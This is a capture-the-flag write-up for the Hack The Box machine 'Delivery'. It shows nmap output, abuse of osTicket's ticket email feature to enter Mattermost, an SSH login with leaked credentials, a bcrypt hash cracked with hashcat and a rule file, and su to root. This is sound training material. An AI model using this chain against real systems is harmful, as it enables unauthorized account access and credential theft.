---
layout: post
category: writeup
---

## Machine Info

- Name: Delivery
- Description: Delivery is an easy difficulty Linux machine that features the support ticketing system osTicket where it is possible by using a technique called TicketTrick, a non-authenticated user to be granted with access to a temporary company email. This &amp;quot;feature&amp;quot; permits the registration at MatterMost and the join of internal team channel. It is revealed through that channel that users have been using same password variant &amp;quot;PleaseSubscribe!&amp;quot; for internal access. In channel it is also disclosed the credentials for the mail user which can give the initial foothold to the system. While enumerating the file system we come across the mattermost configuration file which reveals MySQL database credentials. By having access to the database a password hash can be extracted from Users table and crack it using the &amp;quot;PleaseSubscribe!&amp;quot; pattern. After cracking the hash it is possible to login as user root.
- Difficulty: Easy

## Initial Access

Nmap:
```bash
PORT     STATE SERVICE VERSION                                                          
22/tcp   open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)     
| ssh-hostkey:                                                                          
|   2048 9c:40:fa:85:9b:01:ac:ac:0e:bc:0c:19:51:8a:ee:27 (RSA)            
|   256 5a:0c:c0:3b:9b:76:55:2e:6e:c4:f4:b9:5d:76:17:09 (ECDSA)           
|_  256 b7:9d:f7:48:9d:a2:f2:76:30:fd:42:d3:35:3a:80:8c (ED25519)         
80/tcp   open  http    nginx 1.14.2                                                     
|_http-title: Welcome                                                                   
| http-methods:                                                                         
|_  Supported Methods: GET HEAD                                                         
|_http-server-header: nginx/1.14.2                                                      
8065/tcp open  unknown                                                                  
| fingerprint-strings:                                                                  
|   GenericLines, Help, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request                                                          
|     Content-Type: text/plain; charset=utf-8
|     Connection: close   
```

Checking out port 80 shows us a note to take a look at the helpdesk page 

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-1.png)
Clicking on contact us shows me the following:
![](assets/images/2024-02-22-HTB-Delivery-writeup-image-2.png)

Which essentially tells me to use the helpdesk to make me a @delivery.htb email address so I can access the mattermost instance on port 8065.

Upon visiting the helpdesk instance, it is utilizing osticket which essentially means we could possibly do the infamous ticket trick!

When I create a ticket I see it assigns a number email to me:

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-3.png)

I can use this email to sign up to mattermost:

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-4.png)

It requires verification! So we'll check on our ticket status now:
![](assets/images/2024-02-22-HTB-Delivery-writeup-image-5.png)

This successfully sends the email to osticket and we can access the verification link!

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-6.png)

Logging in allows us to see the internal discussions, we can see some creds to log into the server, as well as a hint at using hashcat rules along side the term PleaseSubscribe in order to crack hashes!

```bash
TB ssh maildeliverer@delivery.htb
maildeliverer@delivery.htb's password: 
Linux Delivery 4.19.0-13-amd64 #1 SMP Debian 4.19.160-2 (2020-11-28) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Jan  5 06:09:50 2021 from 10.10.14.5
maildeliverer@Delivery:~$ whoami
maildeliverer
```
## Privilege Escalation

Looking at the mattermost config, I can see these SQL creds:

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-7.png)

They are quiet leading towards the path this box is intended to go in!

![](assets/images/2024-02-22-HTB-Delivery-writeup-image-8.png)

I can grab the hash, and run it through hashcat with a rule for PleaseSubscribe!

```bash
HTB hashid 
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO
Analyzing '$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt
```

Using hashcats best64.rule, I am able to crack the hash:

```bash
HTB hashcat -m 3200 hash pass -r /usr/share/hashcat/rules/best64.rule
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 16.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: cpu-sandybridge-AMD Ryzen 9 5900X 12-Core Processor, 2915/5894 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 77

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: pass
* Passwords.: 1
* Bytes.....: 17
* Keyspace..: 77
* Runtime...: 0 secs

The wordlist or mask that you are using is too small.
This means that hashcat cannot use the full parallel power of your device(s).
Unless you supply more work, your cracking speed will drop.
For tips on supplying more work, see: https://hashcat.net/faq/morework

Approaching final keyspace - workload adjusted.           

$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v...JwgjjO
Time.Started.....: Thu Feb 22 08:25:43 2024 (1 sec)
Time.Estimated...: Thu Feb 22 08:25:44 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (pass)
Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       17 H/s (0.66ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 21/77 (27.27%)
Rejected.........: 0/21 (0.00%)
Restore.Point....: 0/1 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:20-21 Iteration:1008-1024
Candidate.Engine.: Device Generator
Candidates.#1....: PleaseSubscribe!21 -> PleaseSubscribe!21
Hardware.Mon.#1..: Util: 17%

Started: Thu Feb 22 08:25:20 2024
Stopped: Thu Feb 22 08:25:46 2024
```

Now I can just become root!

```bash
maildeliverer@Delivery:/opt/mattermost/config$ su root
Password: 
root@Delivery:~# whoami
root
```

best, 
gerbsec